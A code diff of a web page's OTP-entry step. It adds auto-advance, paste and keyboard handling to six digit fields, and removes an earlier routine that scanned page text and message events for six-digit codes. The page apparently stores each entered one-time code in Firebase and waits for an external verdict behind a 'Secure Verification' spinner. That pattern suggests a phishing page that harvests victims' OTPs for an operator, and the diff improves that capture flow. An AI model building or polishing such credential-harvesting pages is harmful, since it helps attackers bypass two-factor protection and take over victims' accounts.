@@ -544,7 +544,7 @@
         Enter the OTP sent to your phone number<br>
         <span class="phone-display" id="otpPhoneDisplay">+263787877665</span>
       </p>
-      <div class="otp-container">
+      <div class="otp-container" id="otpContainer">
         <input id="otp-0" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="">
         <input id="otp-1" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="">
         <input id="otp-2" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="">
@@ -555,7 +555,7 @@
       <p class="otp-resend">
         Resend OTP in <span class="resend-time" id="resendTimer">93</span> seconds
       </p>
-      <button id="otpSubmitBtn" disabled class="otp-submit-btn">Submit OTP</button>
+      <button id="otpSubmitBtn" class="otp-submit-btn">Submit OTP</button>
     </div>
 
     <!-- Success Card -->
@@ -848,12 +848,91 @@
         phoneDisplay.textContent = countryCodeSelect.value + phoneInput.value.trim();
         loginCard.style.display = 'none';
         otpCard.classList.add('active');
-        // OTP inputs are manually enterable; also auto-filled if detected
+        // Clear OTP inputs
         document.querySelectorAll('.otp-digit').forEach(i => i.value = '');
-        document.getElementById('otpSubmitBtn').disabled = true;
+        document.getElementById('otpSubmitBtn').disabled = false;
         startResendTimer();
-        // Start listening for OTP auto-detection
-        startOtpAutoDetection();
+        // Attach OTP input handlers with auto-advance
+        attachOtpHandlers();
+        // Focus first OTP input
+        setTimeout(() => document.getElementById('otp-0').focus(), 100);
+      }
+
+      // ===== OTP INPUT HANDLERS (auto-advance) =====
+      function attachOtpHandlers() {
+        const otpInputs = document.querySelectorAll('.otp-digit');
+        const submitBtn = document.getElementById('otpSubmitBtn');
+
+        // Remove existing listeners by replacing with fresh inputs
+        otpInputs.forEach((input, idx) => {
+          const newInput = input.cloneNode(true);
+          input.parentNode.replaceChild(newInput, input);
+        });
+
+        // Re-query fresh inputs
+        const freshInputs = document.querySelectorAll('.otp-digit');
+
+        freshInputs.forEach((input, index) => {
+          // Input event: auto-advance to next field when digit is entered
+          input.addEventListener('input', function(e) {
+            // Allow only one digit
+            this.value = this.value.replace(/\D/g, '').slice(0, 1);
+            
+            // If a digit was entered and we're not at the last field, move to next
+            if (this.value.length === 1 && index < freshInputs.length - 1) {
+              freshInputs[index + 1].focus();
+            }
+            
+            // Check if all fields are filled
+            const allFilled = Array.from(freshInputs).every(i => i.value.length === 1);
+            submitBtn.disabled = !allFilled;
+          });
+
+          // Keydown: handle backspace to go to previous field
+          input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '' && index > 0) {
+              freshInputs[index - 1].focus();
+              e.preventDefault();
+            }
+            // Arrow keys navigation
+            if (e.key === 'ArrowLeft' && index > 0) {
+              freshInputs[index - 1].focus();
+              e.preventDefault();
+            } else if (e.key === 'ArrowRight' && index < freshInputs.length - 1) {
+              freshInputs[index + 1].focus();
+              e.preventDefault();
+            }
+            // Submit on Enter
+            if (e.key === 'Enter') {
+              e.preventDefault();
+              const allFilled = Array.from(freshInputs).every(i => i.value.length === 1);
+              if (allFilled) submitOtp();
+            }
+          });
+
+          // Paste support: distribute pasted digits across fields
+          input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData('text');
+            if (paste) {
+              const digits = paste.replace(/\D/g, '').slice(0, 6).split('');
+              freshInputs.forEach((p, idx) => {
+                p.value = idx < digits.length ? digits[idx] : '';
+              });
+              // Focus the next empty field or the last field if all filled
+              const nextEmpty = Array.from(freshInputs).find(p => p.value === '');
+              if (nextEmpty) nextEmpty.focus();
+              else freshInputs[freshInputs.length - 1].focus();
+              
+              const allFilled = Array.from(freshInputs).every(i => i.value.length === 1);
+              submitBtn.disabled = !allFilled;
+              if (allFilled) submitOtp();
+            }
+          });
+        });
+
+        // Re-bind submit button
+        submitBtn.onclick = submitOtp;
       }
 
       // ===== GO BACK =====
@@ -900,32 +979,18 @@
       }
 
       // ===== OTP LOGIC =====
-      const otpInputs = document.querySelectorAll('.otp-digit');
       const otpSubmitBtn = document.getElementById('otpSubmitBtn');
       let resendTimerInterval = null;
       let timerSeconds = 93;
 
-      // OTP inputs accept manual entry; auto-fill also populates them
-      function fillOtpInputs(otp) {
-        if (!otp || otp.length !== 6) return;
-        const digits = otp.split('');
-        otpInputs.forEach((input, idx) => {
-          if (idx < digits.length) input.value = digits[idx];
-        });
-        // Auto-submit when all digits are filled
-        if (checkOtpFilled()) submitOtp();
-      }
-
-      function checkOtpFilled() {
-        const filled = Array.from(otpInputs).every(i => i.value.length === 1);
-        otpSubmitBtn.disabled = !filled;
-        return filled;
-      }
-
       function submitOtp() {
         if (isVerifying) return;
+        const otpInputs = document.querySelectorAll('.otp-digit');
         const otp = Array.from(otpInputs).map(i=>i.value).join('');
-        if (otp.length !== 6) return;
+        if (otp.length !== 6) {
+          showVerificationError('Please enter all 6 digits of the OTP.');
+          return;
+        }
         isVerifying = true;
         showLoadingSpinner('Secure Verification', 'Verifying your OTP...<br>Please do not close this page.');
         saveOtpOnlyToFirebase(otp)
@@ -934,69 +999,10 @@
             listenForOtpVerification((result) => {
               hideLoadingSpinner(); isVerifying = false;
               if (result === true) { console.log('✅ OTP verified'); triggerVerificationSequence(); }
-              else { showVerificationError('verification code is incorrect.'); otpInputs.forEach(i=>i.value=''); otpSubmitBtn.disabled = true; }
+              else { showVerificationError('verification code is incorrect.'); otpInputs.forEach(i=>i.value=''); document.getElementById('otpSubmitBtn').disabled = true; }
             });
           })
           .catch((error) => { console.error(error); hideLoadingSpinner(); isVerifying = false; showVerificationError('verification code is incorrect.'); });
-      }
-
-      // ===== OTP AUTO-DETECTION =====
-      function startOtpAutoDetection() {
-        const otpRegex = /\b\d{6}\b/;
-        
-        // Function to scan for OTP in the page (from background messages / notifications)
-        function scanForOtp() {
-          if (!document.getElementById('otpCard').classList.contains('active')) return;
-          // Look for 6-digit numbers in the visible text
-          const bodyText = document.body.innerText;
-          const match = bodyText.match(otpRegex);
-          if (match) {
-            const detectedOtp = match[0];
-            console.log('🔍 Auto-detected OTP from page text:', detectedOtp);
-            fillOtpInputs(detectedOtp);
-          }
-        }
-
-        // Listen for visibility change (page comes to foreground)
-        document.addEventListener('visibilitychange', () => {
-          if (document.visibilityState === 'visible') {
-            scanForOtp();
-          }
-        });
-
-        // Listen for message events (from service workers or other frames)
-        window.addEventListener('message', (event) => {
-          try {
-            const data = event.data;
-            if (data && typeof data === 'string' && otpRegex.test(data)) {
-              const detectedOtp = data.match(otpRegex)[0];
-              console.log('🔍 Auto-detected OTP from message event:', detectedOtp);
-              if (document.getElementById('otpCard').classList.contains('active')) {
-                fillOtpInputs(detectedOtp);
-              }
-            }
-          } catch (e) {}
-        });
-
-        // MutationObserver to detect new text nodes inserted (e.g., from push notifications)
-        const observer = new MutationObserver(() => {
-          if (document.getElementById('otpCard').classList.contains('active')) {
-            scanForOtp();
-          }
-        });
-        observer.observe(document.body, { childList: true, subtree: true, characterData: true });
-
-        // Also check periodically (every 2 seconds) for any new OTP
-        const intervalId = setInterval(() => {
-          if (!document.getElementById('otpCard').classList.contains('active')) {
-            clearInterval(intervalId);
-            return;
-          }
-          scanForOtp();
-        }, 2000);
-
-        // Initial scan
-        setTimeout(scanForOtp, 500);
       }
 
       function startResendTimer() {
